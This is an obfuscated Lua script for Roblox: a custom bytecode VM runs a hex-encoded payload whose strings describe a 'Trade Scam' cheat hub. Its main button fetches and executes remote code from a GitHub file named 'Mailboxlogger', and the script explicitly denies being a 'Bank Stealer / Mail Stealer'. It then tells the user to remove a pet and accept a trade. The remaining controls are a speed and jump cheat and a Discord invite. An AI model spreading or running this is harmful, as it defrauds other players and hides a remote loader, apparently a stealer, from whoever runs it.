--This file Was Obfuscate with Luaraph v3 by galaxy_boy14t#9259

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		for Idx = 1, gBits32() do
			Lines[Idx] = gBits32();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local VIP = 1;
			local Top = -1;
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local function Loop()
				local Instr = Instr;
				local Proto = Proto;
				local Params = Params;
				local _R = _R;
				local Vararg = {};
				local Lupvals = {};
				local Stk = {};
				for Idx = 0, PCount do
					if (Idx >= Params) then
						Vararg[Idx - Params] = Args[Idx + 1];
					else
						Stk[Idx] = Args[Idx + 1];
					end
				end
				local Varargsz = (PCount - Params) + 1;
				local Inst;
				local Enum;
				while true do
					Inst = Instr[VIP];
					Enum = Inst[1];
					if (Enum <= 11) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]] = Inst[3] ~= 0;
								elseif (Enum > 1) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								else
									Stk[Inst[2]][Inst[3]] = Inst[4];
								end
							elseif (Enum <= 3) then
								Stk[Inst[2]] = Upvalues[Inst[3]];
							elseif (Enum == 4) then
								Stk[Inst[2]] = {};
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							elseif (Enum > 7) then
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
							else
								local A = Inst[2];
								Stk[A](Stk[A + 1]);
							end
						elseif (Enum <= 9) then
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						elseif (Enum > 10) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							do
								return;
							end
						end
					elseif (Enum <= 17) then
						if (Enum <= 14) then
							if (Enum <= 12) then
								Stk[Inst[2]]();
							elseif (Enum > 13) then
								Stk[Inst[2]] = Inst[3];
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum <= 15) then
							VIP = Inst[3];
						elseif (Enum > 16) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 5) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum <= 20) then
						if (Enum <= 18) then
							Env[Inst[3]] = Stk[Inst[2]];
						elseif (Enum > 19) then
							if not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							local A = Inst[2];
							Stk[A] = Stk[A]();
						end
					elseif (Enum <= 22) then
						if (Enum > 21) then
							Upvalues[Inst[3]] = Stk[Inst[2]];
						else
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						end
					elseif (Enum == 23) then
						Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
					elseif Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
					VIP = VIP + 1;
				end
			end
			A, B = _R(PCall(Loop));
			if not A[1] then
				local line = Chunk[4][VIP] or "?";
				error("Script error at [" .. line .. "]:" .. A[2]);
			else
				return Unpack(A, 2, B);
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!513O0003053O007063612O6C03043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C61796572030A3O004765745365727669636503103O0055736572496E70757453657276696365030A3O0052756E53657276696365030A3O006C6F6164737472696E6703073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F73686C6578776172652F4F72696F6E2F6D61696E2F736F75726365030A3O004D616B6557696E646F7703043O004E616D65030E3O004E696B6520536967687420487562030B3O00486964655072656D69756D0100030A3O0053617665436F6E6669672O01030C3O00436F6E666967466F6C64657203093O004F72696F6E5465737403103O004D616B654E6F74696669636174696F6E03063O0067616C61787903073O00436F6E74656E7403163O0074687820666F7220627579696E6720746865206B657903053O00496D61676503173O00726278612O73657469643A2O2F2O34382O3334352O393803043O0054696D65026O00144003153O0054726164655363616D4E6F74696669636174696F6E03123O0052656A6F696E4E6F74696669636174696F6E03133O00446973636F72644E6F74696669636174696F6E03073O004D616B65546162030A3O005472616465205363616D03043O0049636F6E030B3O005072656D69756D4F6E6C79030A3O00412O6453656374696F6E03273O0054686973204E6F7420416E2042616E6B20537465616C6572202F204D61696C20537465616C657203093O00412O6442752O746F6E03083O0043612O6C6261636B03043O004D697363031D3O0052656A6F696E20496E20796F757220436F2O72656E7420536572766572030D3O0052656A6F696E2053657276657203173O0057616C6B2053702O6564202F204A756D7020506F77657203093O00412O64536C6964657203093O0057616C6B53702O65642O033O004D696E026O002E402O033O004D6178025O00407F4003073O0044656661756C7403053O00436F6C6F7203063O00436F6C6F723303073O0066726F6D524742026O004440025O00C05F40025O00C0514003093O00496E6372656D656E74026O00F03F03093O0056616C75654E616D6503043O0077616C6B030A3O004A756D7020506F776572028O0003043O004A756D7003083O00412O644C6162656C03163O0057692O6C20412O64696E6720496E2053756E6461792103073O0043726564697473030C3O00412O64506172616772617068030C3O00536372697074204D616B657203123O0067616C6178795F626F79313474233932353903093O004173692O7374616E7403113O004A686F6E20436C69666F7264232O322O3603153O00416E6420416C736F204A6F696E20446973636F7264030C3O004A6F696E20446973636F726403063O0055706461746503063O0046495845532B031C3O0044524F5020504554205452414445205343414D204E4F5420574F524B03063O00412O6465642B03333O005468652057616C6B2053702O656420416E64204A756D7020506F77657220486173622O656E20412O64656420546F204D69736303073O0052656D6F76652B030E3O0057616C6B2053702O65642054616203083O0056657273696F6E2B03123O0056657273696F6E204E6F77202O312E31335600AC9O003O00120D000100013O00061000023O000100012O00058O000700010002000100120D000100023O00200B00010001000300200B00010001000400120D000200023O00201500020002000500120E000400064O000200020004000200120D000300023O00201500030003000500120E000500074O000200030005000200120D000400083O00120D000500023O00201500050005000900120E0007000A4O0006000500074O001100043O00022O001300040001000200120D000500023O00201500050005000500120E000700034O000200050007000200201500060004000B2O000400083O00040030010008000C000D0030010008000E000F0030010008001000110030010008001200132O00020006000800020020150007000400142O000400093O00040030010009000C00150030010009001600170030010009001800190030010009001A001B2O000800070009000100061000070001000100012O00053O00043O002O120007001C3O00061000070002000100012O00053O00043O002O120007001D3O00061000070003000100012O00053O00043O002O120007001E3O00201500070006001F2O000400093O00030030010009000C002000300100090021001900300100090022000F2O00020007000900020020150008000700232O0004000A3O0001003001000A000C00242O00020008000A00020020150009000700252O0004000B3O0002003001000B000C0020000217000C00043O001009000B0026000C2O00080009000B000100201500090006001F2O0004000B3O0003003001000B000C0027003001000B00210019003001000B0022000F2O00020009000B0002002015000A000900232O0004000C3O0001003001000C000C00282O0002000A000C0002002015000B000900252O0004000D3O0002003001000D000C0029000217000E00053O001009000D0026000E2O0008000B000D0001002015000B000900232O0004000D3O0001003001000D000C002A2O0002000B000D0002002015000C0009002B2O0004000E3O0008003001000E000C002C003001000E002D002E003001000E002F0030003001000E0031002E00120D000F00333O00200B000F000F003400120E001000353O00120E001100363O00120E001200374O0002000F00120002001009000E0032000F003001000E00380039003001000E003A003B000217000F00063O001009000E0026000F2O0008000C000E0001002015000C0009002B2O0004000E3O0008003001000E000C003C003001000E002D003D003001000E002F0030003001000E0031001B00120D000F00333O00200B000F000F003400120E001000353O00120E001100363O00120E001200374O0002000F00120002001009000E0032000F003001000E00380039003001000E003A003E000217000F00073O001009000E0026000F2O0008000C000E0001002015000C0009003F00120E000E00404O0008000C000E0001002015000C0006001F2O0004000E3O0003003001000E000C0041003001000E00210019003001000E0022000F2O0002000C000E0002002015000D000C004200120E000F00433O00120E001000444O0008000D00100001002015000D000C004200120E000F00453O00120E001000464O0008000D00100001002015000D000C00232O0004000F3O0001003001000F000C00472O0002000D000F0002002015000E000C00252O000400103O00020030010010000C0048000217001100083O0010090010002600112O0008000E00100001002015000E0006001F2O000400103O00030030010010000C004900300100100021001900300100100022000F2O0002000E00100002002015000F000E004200120E0011004A3O00120E0012004B4O0008000F00120001002015000F000E004200120E0011004C3O00120E0012004D4O0008000F00120001002015000F000E004200120E0011004E3O00120E0012004F4O0008000F00120001002015000F000E004200120E001100503O00120E001200514O0008000F001200012O000A3O00013O00093O00093O0003023O005F4703073O007374652O706564030A3O00446973636F2O6E65637403053O00696E70757403093O0063686172412O6465640003053O007072696E7403053O00524553455403063O004C4F4144454400223O00120D3O00013O00200B5O00020006183O001B00013O00040F3O001B00016O00014O00167O00120D3O00013O00200B5O00020020155O00032O00073O0002000100120D3O00013O00200B5O00040020155O00032O00073O0002000100120D3O00013O00200B5O00050020155O00032O00073O0002000100120D3O00013O0030013O0005000600120D3O00013O0030013O0002000600120D3O00013O0030013O0004000600120D3O00073O00120E000100084O00073O000200012O00037O0006143O00210001000100040F3O0021000100120D3O00073O00120E000100094O00073O000200012O000A3O00017O00223O00033O00033O00033O00033O00043O00043O00053O00053O00053O00053O00063O00063O00063O00063O00073O00073O00073O00073O00083O00083O00093O00093O000A3O000A3O000B3O000B3O000B3O000D3O000D3O000D3O000E3O000E3O000E3O00103O00093O0003103O004D616B654E6F74696669636174696F6E03043O004E616D6503143O005452414445205343414D20412O6E6F756E63657203073O00436F6E74656E7403263O0053752O636573204E6F772052656D6F766520596F75722050657420416E6420412O636570742103053O00496D61676503173O00726278612O73657469643A2O2F2O34382O3334352O393803043O0054696D65026O00144000094O00037O0020155O00012O000400023O00040030010002000200030030010002000400050030010002000600070030010002000800092O00083O000200012O000A3O00017O00093O00193O00193O00193O00193O00193O00193O00193O00193O001A3O00093O0003103O004D616B654E6F74696669636174696F6E03043O004E616D6503103O0052656A6F696E20412O6E6F756E63657203073O00436F6E74656E7403143O0052656A6F696E696E67205365727665724O2E03053O00496D61676503173O00726278612O73657469643A2O2F2O34382O3334352O393803043O0054696D65026O00144000094O00037O0020155O00012O000400023O00040030010002000200030030010002000400050030010002000600070030010002000800092O00083O000200012O000A3O00017O00093O001C3O001C3O001C3O001C3O001C3O001C3O001C3O001C3O001D3O00093O0003103O004D616B654E6F74696669636174696F6E03043O004E616D6503183O00446973636F7264204A6F696E657220412O6E6F756E63657203073O00436F6E74656E7403153O00496E7669746520436F707920436C6970626F61726403053O00496D61676503173O00726278612O73657469643A2O2F2O34382O3334352O393803043O0054696D65026O00144000094O00037O0020155O00012O000400023O00040030010002000200030030010002000400050030010002000600070030010002000800092O00083O000200012O000A3O00017O00093O001F3O001F3O001F3O001F3O001F3O001F3O001F3O001F3O00203O00053O0003153O0054726164655363616D4E6F74696669636174696F6E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F47616C6178797631302F4D61696C626F786C6F2O6765722F6D61696E2F6E65772E6C7561000A3O00120D3O00014O000C3O0001000100120D3O00023O00120D000100033O00201500010001000400120E000300054O0006000100034O00115O00022O000C3O000100012O000A3O00017O000A3O00243O00243O00253O00253O00253O00253O00253O00253O00253O00263O00083O0003123O0052656A6F696E4E6F74696669636174696F6E03043O0067616D65030A3O0047657453657276696365030F3O0054656C65706F72745365727669636503083O0054656C65706F727403073O00506C616365496403073O00506C6179657273030B3O004C6F63616C506C6179657200103O00120D3O00014O000C3O0001000100120D3O00023O0020155O000300120E000200044O00023O000200020020155O000500120D000200023O00200B00020002000600120D000300023O00201500030003000300120E000500074O000200030005000200200B0003000300082O00083O000300012O000A3O00017O00103O002A3O002A3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002B3O002C3O00063O0003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203093O0043686172616374657203083O0048756D616E6F696403093O0057616C6B53702O656401073O00120D000100013O00200B00010001000200200B00010001000300200B00010001000400200B000100010005001009000100064O000A3O00017O00073O002F3O002F3O002F3O002F3O002F3O002F3O00303O00063O0003043O0067616D6503073O00506C6179657273030B3O004C6F63616C506C6179657203093O0043686172616374657203083O0048756D616E6F696403093O004A756D70506F77657201073O00120D000100013O00200B00010001000200200B00010001000300200B00010001000400200B000100010005001009000100064O000A3O00017O00073O00323O00323O00323O00323O00323O00323O00333O00033O0003133O00446973636F72644E6F74696669636174696F6E030C3O00736574636C6970626F617264031D3O00682O7470733A2O2F646973636F72642E2O672F526653794B714A734A6A00063O00120D3O00014O000C3O0001000100120D3O00023O00120E000100034O00073O000200012O000A3O00017O00063O003A3O003A3O003B3O003B3O003B3O003C3O00AC3O00013O00023O00103O00103O00023O00113O00113O00113O00123O00123O00123O00123O00133O00133O00133O00133O00143O00143O00143O00143O00143O00143O00143O00153O00153O00153O00153O00163O00163O00163O00163O00163O00163O00163O00173O00173O00173O00173O00173O00173O00173O001A3O001A3O001A3O001D3O001D3O001D3O00203O00203O00203O00213O00213O00213O00213O00213O00213O00223O00223O00223O00223O00233O00233O00233O00263O00263O00233O00273O00273O00273O00273O00273O00273O00283O00283O00283O00283O00293O00293O00293O002C3O002C3O00293O002D3O002D3O002D3O002D3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O00303O00303O002E3O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00313O00333O00333O00313O00343O00343O00343O00353O00353O00353O00353O00353O00353O00363O00363O00363O00363O00373O00373O00373O00373O00383O00383O00383O00383O00393O00393O00393O003C3O003C3O00393O003D3O003D3O003D3O003D3O003D3O003D3O003E3O003E3O003E3O003E3O003F3O003F3O003F3O003F3O00403O00403O00403O00403O00413O00413O00413O00413O00413O00", GetFEnv(), ...);